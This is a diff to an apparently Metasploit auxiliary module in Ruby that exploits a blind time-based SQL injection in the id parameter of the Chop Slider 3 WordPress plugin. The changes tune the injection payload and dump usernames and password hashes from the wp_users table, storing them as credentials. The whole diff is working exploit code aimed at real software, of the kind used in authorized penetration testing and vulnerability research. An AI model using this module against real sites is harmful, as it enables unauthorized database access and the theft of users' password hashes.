@@ -8,12 +8,19 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::SQLi
 
+  require 'metasploit/framework/hashes/identify'
+
   def initialize(info = {})
     super(
       update_info(
         info,
         'Name' => 'WordPress ChopSlider3 id SQLi Scanner',
         'Description' => %q{
+          The iDangero.us Chop Slider 3 WordPress plugin prior to version 3.4
+          contains a blind SQL injection in the id parameter of the
+          get_sript/index.php page.  The injection is passed through GET
+          parameters, and thus must be encoded,
+          and magic_quotes is applied at the server.
         },
         'Author' =>
           [
@@ -40,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-  def run_host(_ip)
+  def run_host(ip)
     unless wordpress_and_online?
       vprint_error('Server not online or not detected as wordpress')
       return
@@ -55,15 +62,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     sliderid = Rex::Text.rand_text_numeric(8..10)
-    #cookie = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'wp-login.php') }).get_cookies
-    # text = Rex::Text::rand_text_alpha(3,5)
-    #password = Rex::Text.rand_text_alpha(10)
 
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
-      #if payload.include?('<')
-      #  payload.gsub!(/<>/, '=')
-      #  payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) { '0,' + Regexp.last_match(1) }
-      #end
+      if payload.include?("''")
+        payload.gsub!("''", 'hex(0x00)')
+      end
+
       payload = Rex::Text.uri_encode(payload)
       res = send_request_raw({
         'method' => 'GET',
@@ -77,10 +81,32 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
     columns = ['user_login', 'user_pass']
-    results = @sqli.dump_table_fields('wp_users', columns, condition = '', num_limit = datastore['COUNT'])
+
+    print_status('Enumerating Usernames')
+    un = @sqli.dump_table_fields('wp_users', [columns[0]], '', datastore['COUNT'])
+
+    print_status('Enumerating Password Hashes')
+    pass = @sqli.dump_table_fields('wp_users', [columns[1]], '', datastore['COUNT'])
+
+    un = un.zip(pass)
+
     table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
-    results.each do |user|
-      table << user
+    un.each do |user|
+      create_credential({
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: user[0],
+        private_type: :nonreplayable_hash,
+        jtr_format: identify_hash(user[1]),
+        private_data: user[1],
+        service_name: 'Wordpress',
+        address: ip,
+        port: datastore['RPORT'],
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      })
+      table << [user[0][0], user[1][0]]
     end
     print_good(table.to_s)
   end
